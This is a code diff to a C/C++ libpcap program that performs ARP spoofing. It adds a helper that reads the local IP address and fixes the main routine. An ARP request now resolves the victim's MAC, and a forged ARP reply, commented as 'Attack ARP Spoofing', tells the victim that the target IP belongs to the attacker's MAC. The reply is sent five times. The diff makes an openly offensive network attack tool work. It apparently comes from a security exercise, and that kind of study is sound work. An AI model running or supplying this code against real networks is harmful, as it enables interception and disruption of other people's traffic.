@@ -144,6 +144,30 @@ void print_port(uint16_t port) {
     printf("%u\n", (port&0xFF) << 8 | port >> 8);
 }
 
+void getMyIpAddress(char* iface, u_char* my_ip){
+    char errbuf[PCAP_ERRBUF_SIZE];
+    char ip_string[20];
+    pcap_if_t *alldevs;
+    int status = pcap_findalldevs(&alldevs, errbuf);
+    if(status != 0) {
+        printf("%s\n", errbuf);
+        return ;
+    }
+
+    for(pcap_if_t *d=alldevs; d!=NULL; d=d->next) {
+        if(!strcmp(d->name, iface)){
+            for(pcap_addr_t *a=d->addresses; a!=NULL; a=a->next) {
+                if(a->addr->sa_family == AF_INET)
+                    sprintf(ip_string, "%s", inet_ntoa(((struct sockaddr_in*)a->addr)->sin_addr));
+            }
+        }
+    }
+
+    parsing_string2ip(my_ip, ip_string);
+    pcap_freealldevs(alldevs);
+    return ;
+}
+
 void getMacAddress(u_char * uc_Mac, char* iface)
 {
     int fd;
@@ -164,7 +188,7 @@ void getMacAddress(u_char * uc_Mac, char* iface)
 }
 
 void GetGatewayForInterface(const char* interface, u_char* gateway_ip) {
-  char* gateway = NULL;
+  char* gateway = nullptr;
 
   FILE* fp = popen("netstat -rn", "r");
   char line[256]={0x0};
@@ -302,10 +326,12 @@ int main(int argc, char* argv[]) {
   }
 
   char* dev = argv[1];
+  u_char my_ip[4];
   u_char sender_ip[4];
   u_char target_ip[4];
   char errbuf[PCAP_ERRBUF_SIZE];
 
+  getMyIpAddress(dev, my_ip);
   parsing_string2ip(sender_ip, argv[2]);
   parsing_string2ip(target_ip, argv[3]);
 
@@ -318,19 +344,20 @@ int main(int argc, char* argv[]) {
   u_char my_mac[6]={0};
   getMacAddress(my_mac, dev);
 
+  /*
   u_char gateway_ip[4]={0};
   GetGatewayForInterface(dev, gateway_ip);
-
+  */
   ARPpacket arp_packet;
-  make_arp_request(&arp_packet, my_mac, sender_ip, target_ip);
+  make_arp_request(&arp_packet, my_mac, my_ip, sender_ip);
 
-  // find Target MAC address
-  u_char target_mac[6];
-  findMacAddress(handle, &arp_packet, target_mac);
+  // find Sender_ip MAC address
+  u_char sender_mac[6];
+  findMacAddress(handle, &arp_packet, sender_mac);
 
   // Attack ARP Spoofing
   ARPpacket arp_attack_packet;
-  make_arp_reply(&arp_attack_packet, my_mac, sender_ip, target_mac, sender_ip, gateway_ip);
+  make_arp_reply(&arp_attack_packet, my_mac, my_ip, sender_mac, sender_ip, target_ip);
   for(int i=0; i<5; i++)
     pcap_sendpacket(handle,(const u_char*)&arp_attack_packet,60);
 
